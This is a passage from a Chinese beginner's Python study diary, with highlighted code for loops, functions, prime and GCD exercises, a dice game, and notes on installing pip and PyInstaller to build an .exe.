class="hljs-string">&#x27;apple&#x27;</span>,<span class="hljs-string">&#x27;orange&#x27;</span>,<span class="hljs-string">&#x27;banana&#x27;</span>,<span class="hljs-string">&#x27;pear&#x27;</span>,<span class="hljs-string">&#x27;watermelon&#x27;</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(fruits[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>:<span class="hljs-number">2</span>])</span></span><br></code></pre></td></tr></table></figure><p>会输出apple和banana,从list的第0位开始输出,一个输出三个,,所以输出第0个和第2个</p><p><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427202635.png" alt="img"></p><p>布尔值</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">flag1</span>=1==1<br><span class="hljs-attribute">flag2</span>=1&gt;2<br><span class="hljs-built_in">print</span>(flag1)   #<span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(flag2)   #<span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><p>1.华氏度摄氏度转化<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427211316.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427211316.png" alt="img"></a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-attribute">float</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;f= &#x27;</span>))<br>c=(f-<span class="hljs-number">32</span>)/<span class="hljs-number">1.8</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;%.1f华氏度=%.1f摄氏度&#x27;</span>%(f,c)</span></span>)<br></code></pre></td></tr></table></figure><p>2.圆的面积和周长</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">r</span>=float(input(&#x27;输入半径:&#x27;))<br><span class="hljs-attribute">l</span>=2*3.14*r<br><span class="hljs-attribute">s</span>=3.14*r*r<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;周长:%.3f  面积:%.3f&#x27;</span>%(l,s))<br></code></pre></td></tr></table></figure><p>3.判断闰年</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">year</span>=int(input(&#x27;输入年份:&#x27;))<br>is_leap= year%<span class="hljs-attribute">4</span>==0 <span class="hljs-keyword">and</span> year%100!=0 <span class="hljs-keyword">or</span> year%<span class="hljs-attribute">400</span>==0<br><span class="hljs-built_in">print</span>(is_leap)<br></code></pre></td></tr></table></figure><h1 id="4-28"><a href="#4-28" class="headerlink" title="4.28"></a>4.28</h1><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="分支判断结构"><a href="#分支判断结构" class="headerlink" title="分支判断结构"></a>分支判断结构</h3><p>就是if语句,但是没有括号,用缩进来包含if语句的内容,没有else if,只有elif和else,if和else语句结束后最后都要加上冒号,else后不能加条件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=input(&#x27;输入用户名:&#x27;)<br><span class="hljs-attribute">password</span>=input(&#x27;输入密码:&#x27;)<br><span class="hljs-comment">#用户名是123,密码为456</span><br><span class="hljs-keyword">if</span> <span class="hljs-attribute">username</span>==&#x27;123&#x27; <span class="hljs-keyword">and</span> password == <span class="hljs-string">&#x27;456&#x27;</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;登陆成功&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错了&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><h4 id="for-in循环"><a href="#for-in循环" class="headerlink" title="for-in循环"></a>for-in循环</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sum=<span class="hljs-number">0</span><br>num=<span class="hljs-built_in">int</span>(<span class="hljs-selector-tag">input</span>(<span class="hljs-string">&#x27;输入循环次数:&#x27;</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(num)</span></span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>    sum+=<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(sum)</span></span><br></code></pre></td></tr></table></figure><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230428151150.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230428151150.png" alt="img"></a><br>输入默认是字符串类型,要改成int型,记得打冒号<br>range(起始值,终止值,步长):<br>前闭后开区间,步长可以为负,比如range(100,0,-2):</p><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import random<br><span class="hljs-attribute">answer</span>=random.randint(1,100)<br><span class="hljs-attribute">counter</span>=0<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    counter+=1<br>    <span class="hljs-attribute">y_answer</span>=int(input(&#x27;输入值&#x27;))<br>    <span class="hljs-keyword">if</span> <span class="hljs-attribute">answer</span>==y_answer:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜对了&#x27;</span>)<br>        break<br>    elif answer&gt;y_answer:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;小了&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;大了&#x27;</span>)<br><span class="hljs-keyword">if</span> counter&gt;5:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错的次数太多了&#x27;</span>)<br></code></pre></td></tr></table></figure><p>import random是引入了random模块,randint是模块下的一个函数,在1到100(不包括100)之间生成一个随机数<br>也可以这样</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br>answer = randint(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><h4 id="作业-1"><a href="#作业-1" class="headerlink" title="作业"></a>作业</h4><p>素数判定</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> math import sqrt<br><span class="hljs-attribute">n</span>=int(input(&#x27;输入:&#x27;))<br><span class="hljs-attribute">nn</span>=int(sqrt(n))<br><span class="hljs-attribute">is_prime</span>=<span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(2,nn+1):<br>    <span class="hljs-keyword">if</span> n % <span class="hljs-attribute">i</span>==0:<br>        <span class="hljs-attribute">is_prime</span>=<span class="hljs-literal">False</span><br>        break<br><span class="hljs-keyword">if</span> is_prime <span class="hljs-keyword">and</span> n != 1:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%d是素数&#x27;</span>%n)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;no&#x27;</span>)<br></code></pre></td></tr></table></figure><p>一开始is_prime的等于号多打了一个,搞半天</p><h1 id="4-29"><a href="#4-29" class="headerlink" title="4.29"></a>4.29</h1><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><p>复习章</p><h3 id="水仙花数"><a href="#水仙花数" class="headerlink" title="水仙花数"></a>水仙花数</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=int(input(&#x27;输入一个三位数:&#x27;))<br><span class="hljs-attribute">l</span>=a%10<br><span class="hljs-built_in">print</span>(l)<br><span class="hljs-attribute">m</span>=int(a/10%10)           #也可以直接写成<span class="hljs-attribute">m</span>=a//10%10,python的//才等于c的/,py的//在整数运算时会保留小数<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-attribute">h</span>=int(a/100)             #<span class="hljs-attribute">h</span>=a//100<br><span class="hljs-built_in">print</span>(h)<br><span class="hljs-keyword">if</span> l*<span class="hljs-number">*3</span>+m*<span class="hljs-number">*3</span>+h*<span class="hljs-number">*3</span>==a:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;是水仙花数&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;no&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="动态规划问题-还不会用dp做"><a href="#动态规划问题-还不会用dp做" class="headerlink" title="动态规划问题(还不会用dp做)"></a>动态规划问题(还不会用dp做)</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#dp其实还不会</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">21</span>):              #<span class="hljs-number">100</span>全买最贵的公鸡也就<span class="hljs-number">20</span>只,所以<span class="hljs-number">20</span>位穷举的最大值<br>    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">0</span>,<span class="hljs-number">33</span>):<br>        <span class="hljs-attribute">for</span> k in range(<span class="hljs-number">0</span>,<span class="hljs-number">300</span>):<br>            <span class="hljs-attribute">if</span> i*<span class="hljs-number">5</span>+j*<span class="hljs-number">3</span>+k/<span class="hljs-number">3</span>==<span class="hljs-number">100</span>:<br>                <span class="hljs-attribute">print</span>(&#x27;%d只公鸡%d只母鸡%d小鸡&#x27;%(i,j,k))<br></code></pre></td></tr></table></figure><p>本来以为不会做直接看答案的,没想到碰出来了</p><h3 id="骰子"><a href="#骰子" class="headerlink" title="骰子"></a>骰子</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> random import randint<br><span class="hljs-keyword">from</span> time import sleep<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;你现在有1000元&#x27;</span>)<br><span class="hljs-attribute">money</span>=1000<br><span class="hljs-keyword">while</span> money&gt;0:<br>    <span class="hljs-attribute">x</span>=int(input(&#x27;你想下注多少:&#x27;))<br>    <span class="hljs-keyword">if</span> <span class="hljs-attribute">x</span>==money:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;这是一场豪赌!&#x27;</span>)<br>    <span class="hljs-keyword">if</span> x&lt;=money <span class="hljs-keyword">and</span> x&gt;0:<br>        <span class="hljs-attribute">first</span>=randint(1,6)+randint(1,6)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第一次点数为:%d(为7或11时赢,为2,3,12时输)&#x27;</span>%first)<br>        <span class="hljs-attribute">flag</span>=0<br>        <span class="hljs-keyword">if</span> <span class="hljs-attribute">first</span>==7 <span class="hljs-keyword">or</span> <span class="hljs-attribute">first</span>==11:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;玩家胜!&#x27;</span>)<br>            money+=x<br>            <span class="hljs-attribute">flag</span>=1<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;玩家余额为:%d&#x27;</span>%money)<br>        elif <span class="hljs-attribute">first</span>==2 <span class="hljs-keyword">or</span> <span class="hljs-attribute">first</span>==3 <span class="hljs-keyword">or</span> <span class="hljs-attribute">first</span>==12:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;玩家输&#x27;</span>)<br>            <span class="hljs-attribute">money-</span>=x<br>            <span class="hljs-attribute">flag</span>=1<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;玩家余额为:%d&#x27;</span>%money)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">while</span> <span class="hljs-attribute">flag</span>==0:<br>                <span class="hljs-attribute">n</span>=randint(1,6)+randint(1,6)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;这次你投的点数为:%d(为%d时你赢,为7时你输)&#x27;</span>%(n,first))<br>                <span class="hljs-keyword">if</span> <span class="hljs-attribute">n</span>==first:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;玩家胜!&#x27;</span>)<br>                    money+=x<br>                    <span class="hljs-attribute">flag</span>=1<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;玩家余额为:%d&#x27;</span>%money)<br>                elif <span class="hljs-attribute">n</span>==7:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;玩家输&#x27;</span>)<br>                    <span class="hljs-attribute">money-</span>=x<br>                    <span class="hljs-attribute">flag</span>=1<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;玩家余额为:%d&#x27;</span>%money)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;余额不足&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;你破产了&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;赌博伤财,5s后自动退出游戏&#x27;</span>)<br>s = 5<br><span class="hljs-keyword">while</span> s &gt; 0:<br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;游戏将在&#123;s&#125;秒后退出&#x27;</span>)<br>    sleep(1)<br>    s -= 1<br></code></pre></td></tr></table></figure><h4 id="把-py转化为-exe"><a href="#把-py转化为-exe" class="headerlink" title="把.py转化为.exe"></a>把.py转化为.exe</h4><p>在伟大的克劳德的帮助下做了手工的第一个游戏(只是一个可执行.exe文件)</p><h5 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h5><p>按理来说是python下载时会自动配置好的,都不知道为什么我的没有,可能是因为安在d盘的原因吧</p><ol><li>先确保电脑下载了pip,方法:终端输入pip –version会报版本号,如果显示不是可执行的文件或者别的就是没下载或者没配置好环境</li><li>如果没下载pip,就新建一个文件,名为get-pip.py</li><li>复制<code>https://bootstrap.pypa.io/get-pip.py</code>所有内容到刚刚的.py文件中</li><li>在建的文件的路径下,打开终端,输入<code>python get-pip.py</code>即可</li></ol><h5 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h5><p>打开终端,输入<code>pip install PyInstaller</code>即可</p><h5 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h5><p>比如我要转换的骰子.py文件是在E:\py\day3 路径下的,那么在day3这个文件夹下打开终端,输入<code>pyinstaller --onefile 骰子.py</code>即可,随后会生成dist和build两个文件夹,打开dist文件夹即可找到骰子.exe,这个可执行文件可以直接发给别人(指电脑上没有python环境的人)使用</p><h1 id="4-30"><a href="#4-30" class="headerlink" title="4.30"></a>4.30</h1><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="函数和模块的使用"><a href="#函数和模块的使用" class="headerlink" title="函数和模块的使用"></a>函数和模块的使用</h3><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>使用<code>def</code>定义函数 (define)<br>Cnm</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">fac</span>(num):<br>result=<span class="hljs-number">1</span><br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,num+<span class="hljs-number">1</span>):<br>result*=i<br>return result<br>m=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;m=&#x27;</span>))<br>n=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;n=&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">fac</span>(m)//<span class="hljs-built_in">fac</span>(n)//<span class="hljs-built_in">fac</span>(m-n))<br></code></pre></td></tr></table></figure><h5 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h5><p>可以像上面那样不给参数赋值,也可以赋给默认值<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230430183540.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230430183540.png" alt="img"></a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> random import randint<br>def roll(<span class="hljs-attribute">n</span>=2):<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;投&#123;n&#125;个骰子&#x27;</span>)<br><span class="hljs-attribute">total</span>=0<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(n):<br>total+=randint(1,6)<br>return total<br>def <span class="hljs-built_in">add</span>(<span class="hljs-attribute">a</span>=0,b=0,c=0):<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;a为&#123;a&#125;,b为&#123;b&#125;,c为&#123;c&#125;&#x27;</span>)<br>return a+b+c<br><span class="hljs-built_in">print</span>(roll(randint(1,10)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">add</span>(1))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">add</span>(1,2))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">add</span>(1,2,3))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">add</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">add</span>(<span class="hljs-attribute">c</span>=1,a=4,b=6))<br></code></pre></td></tr></table></figure><h5 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> add(*n):<br>    <span class="hljs-attribute">total</span>=<span class="hljs-number">0</span><br>    <span class="hljs-attribute">for</span> num in n:<br>        <span class="hljs-attribute">total</span>+=num<br>    <span class="hljs-attribute">return</span> total<br><span class="hljs-attribute">print</span>(add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><p>可以引用自带库的,也可以引用自己写的</p><h5 id="moudle"><a href="#moudle" class="headerlink" title="moudle"></a>moudle</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">p</span>():</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)</span><br></code></pre></td></tr></table></figure><h5 id="m1"><a href="#m1" class="headerlink" title="m1"></a>m1</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">p</span>():</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;world&#x27;</span>)</span><br></code></pre></td></tr></table></figure><h5 id="test"><a href="#test" class="headerlink" title="test"></a>test</h5><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">import moudle as <span class="hljs-name">m2</span><br>import <span class="hljs-name">m1</span><br><span class="hljs-name">m2.</span>p<span class="hljs-comment">()</span>       <span class="hljs-attr">#moudle.p()此时已经不行了</span><br><span class="hljs-attr">m1</span>.p<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">from</span> moudle import <span class="hljs-selector-tag">p</span><br><span class="hljs-selector-tag">p</span>()<br><span class="hljs-selector-tag">from</span> m1 import <span class="hljs-selector-tag">p</span><br><span class="hljs-selector-tag">p</span>()<br></code></pre></td></tr></table></figure><h3 id="作业-2"><a href="#作业-2" class="headerlink" title="作业"></a>作业</h3><h4 id="最大公约数和最小公倍数"><a href="#最大公约数和最小公倍数" class="headerlink" title="最大公约数和最小公倍数"></a>最大公约数和最小公倍数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">x=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>y=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">x,y</span>):<br>    (x,y)=(y,x) <span class="hljs-keyword">if</span> x&gt;y <span class="hljs-keyword">else</span> (x,y)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(x,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> x%i==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> y%i==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> i<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>和<span class="hljs-subst">&#123;y&#125;</span>的最大公约数为<span class="hljs-subst">&#123;b(x,y)&#125;</span>&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> x*y//b(x,y)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>和<span class="hljs-subst">&#123;y&#125;</span>的最小公倍数为<span class="hljs-subst">&#123;p(x,y)&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="素数"><a href="#素数" class="headerlink" title="素数"></a>素数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;输入一个数:&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_prime</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">int</span>(a**<span class="hljs-number">0.5</span>+<span class="hljs-number">1</span>)):<br>        <span class="hljs-keyword">if</span> a%i==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> i!=<span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(is_prime(a))<br></code></pre></td></tr></table></figure><h1 id="5-1"><a href="#5-1" class="headerlink" title="5.1"></a>5.1</h1><h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><p>字符串</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">&#x27;1234abcd&#x27;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s[::-<span class="hljs-number">1</span>])</span></span>   <span class="hljs-number">#dcba4321</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(len(s)</span></span>)    <span class="hljs-selector-id">#len</span>()求字符串长度  <span class="hljs-number">8</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;23&#x27;</span> in s)</span></span>  <span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;wd&#x27;</span> in s)</span></span>  <span class="hljs-selector-id">#False</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.find(<span class="hljs-string">&#x27;a&#x27;</span>)</span></span>) #<span class="hljs-number">4</span>  (<span class="hljs-number">01234</span>)a是<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h1 id="5-2"><a href="#5-2" class="headerlink" title="5.2"></a>5.2</h1><h2 id="Day7-1"><a href="#Day7-1" class="headerlink" title="Day7"></a>Day7</h2><h3 id="列表"><a href="#列表" class="headerlink" title="列表 []"></a>列表 []</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">list1=<span class="hljs-selector-attr">[1,3,5,7,9,11,13,15]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span 